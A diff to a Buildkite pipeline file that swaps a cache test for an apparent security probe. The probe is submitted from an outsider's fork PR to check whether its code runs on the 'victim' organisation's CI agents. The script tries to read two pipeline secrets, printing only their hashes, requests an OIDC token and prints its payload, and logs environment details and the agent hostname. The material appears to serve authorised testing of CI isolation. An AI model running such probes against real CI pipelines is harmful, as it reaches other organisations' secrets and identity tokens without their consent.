@@ -1,38 +1,41 @@
-# File to be placed at `.buildkite/pipeline.yml` on branch `main` of
-# ali-dev-test-2/bk-forktest (the repository of pipeline `fork-pr`).
-# Legit main-branch build on the branch-scoped registry `forkpr-cache`:
-#   LVCR_PHASE=save (default, e.g. a push-triggered build): write the marker, save the
-#     entry, read it back.
-#   LVCR_PHASE=check (set on a build created through the API): read back only, so the
-#     trusted branch's next restore can be observed without re-saving first.
-# `$$` is Buildkite's escape for a literal `$` at runtime (in-repo pipelines are
-# interpolated at upload time).
+# Outsider probe: `.buildkite/pipeline.yml` on branch `main` of the FORK
+# ali-dev-test/bk-forktest, opened as PR #1 into ali-dev-test-2/bk-forktest:main.
+# ali-dev-test is NOT a member of bk-tb-victim and NOT a collaborator on the base repo.
+# If this file's commands run in the victim org's cluster, outsider code executed there.
+# `$$` is Buildkite's escape for a literal `$` at runtime.
 steps:
-  - label: ":package: build + cache (main)"
+  - label: ":fork: outsider fork-event probe"
     agents:
       queue: cp-v4
-    env:
-      BUILDKITE_AGENT_CACHE_STORE_URL: "file:///bkshare/forkpr-store"
     command: |
       set +e
-      REG=forkpr-cache
-      API="https://agent.buildkite.com/v3/cache_registries/$$REG"
-      AUTH="Authorization: Token $$BUILDKITE_AGENT_ACCESS_TOKEN"
-      J='Content-Type: application/json'
-      ADDR='{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}]}'
-      PHASE="$${LVCR_PHASE:-save}"
-      echo "BRANCH=[$$BUILDKITE_BRANCH] COMMIT=[$$BUILDKITE_COMMIT] PIPELINE=[$$BUILDKITE_PIPELINE_SLUG] PHASE=[$$PHASE]"
-      echo "SOURCE=[$$BUILDKITE_SOURCE] PR=[$$BUILDKITE_PULL_REQUEST] REPO=[$$BUILDKITE_REPO]"
-      printf 'caches:\n  - name: fp\n    cache_key:\n      - fp-key\n    target_paths:\n      - /tmp/fp\n' > /tmp/fp-cache.yml
-      if [ "$$PHASE" = "save" ]; then
-        mkdir -p /tmp/fp
-        echo "MAIN-ENTRY-CONTENT" > /tmp/fp/marker.txt
-        echo "=== cache save ==="
-        buildkite-agent cache save --registry $$REG --force --cache-config-file /tmp/fp-cache.yml 2>&1 | tail -6
+      echo "########## identity ##########"
+      echo "OUTSIDER_PROBE_REV=[FEP-1]"
+      echo "BRANCH=[$$BUILDKITE_BRANCH] PIPELINE=[$$BUILDKITE_PIPELINE_SLUG] ORG=[$$BUILDKITE_ORGANIZATION_SLUG]"
+      echo "PR=[$$BUILDKITE_PULL_REQUEST] BASE=[$$BUILDKITE_PULL_REQUEST_BASE_BRANCH] PRREPO=[$$BUILDKITE_PULL_REQUEST_REPO]"
+      echo "SOURCE=[$$BUILDKITE_SOURCE] REPO=[$$BUILDKITE_REPO] COMMIT=[$$BUILDKITE_COMMIT]"
+      echo "GH_EVENT=[$$BUILDKITE_GITHUB_EVENT] GH_ACTION=[$$BUILDKITE_GITHUB_ACTION]"
+      echo "CREATOR=[$$BUILDKITE_BUILD_CREATOR] AUTHOR=[$$BUILDKITE_BUILD_AUTHOR]"
+      echo "HEAD=[$$(git rev-parse HEAD 2>/dev/null || echo NOCHECKOUT)]"
+      echo "HEADFILE=[$$(head -c 40 .buildkite/pipeline.yml 2>/dev/null | tr '\n' ' ')]"
+      echo "JOBTOKENLEN=[$${#BUILDKITE_AGENT_ACCESS_TOKEN}]"
+
+      echo "########## secrets ##########"
+      if V=$$(buildkite-agent secret get FORKEVT 2>/dev/null); then
+        echo "FORKEVT_SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
+      else
+        echo "FORKEVT_SECRET_DENIED"
       fi
-      echo "=== raw retrieve (own, server-resolved scopes) ==="
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d "$$ADDR" "$$API/retrieve"; echo
-      echo "=== agent restore read-back ==="
-      rm -rf /tmp/fp; mkdir -p /tmp/fp
-      buildkite-agent cache restore --registry $$REG --cache-config-file /tmp/fp-cache.yml 2>&1 | tail -8
-      echo "readback: $$(cat /tmp/fp/marker.txt 2>&1)"
+      if V=$$(buildkite-agent secret get FORKEVTMAIN 2>/dev/null); then
+        echo "FORKEVTMAIN_SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
+      else
+        echo "FORKEVTMAIN_SECRET_DENIED"
+      fi
+
+      echo "########## OIDC ##########"
+      T=$$(buildkite-agent oidc request-token --audience forkevt-oidc --lifetime 120 2>/dev/null)
+      if [ -n "$$T" ]; then echo "OIDC_PAYLOAD $$(printf %s "$$T" | cut -d. -f2)"; else echo "OIDC none"; fi
+
+      echo "########## marker ##########"
+      echo "OUTSIDER_CODE_EXECUTED_ON_VICTIM_AGENT [$$(hostname)]"
+      echo "########## done ##########"
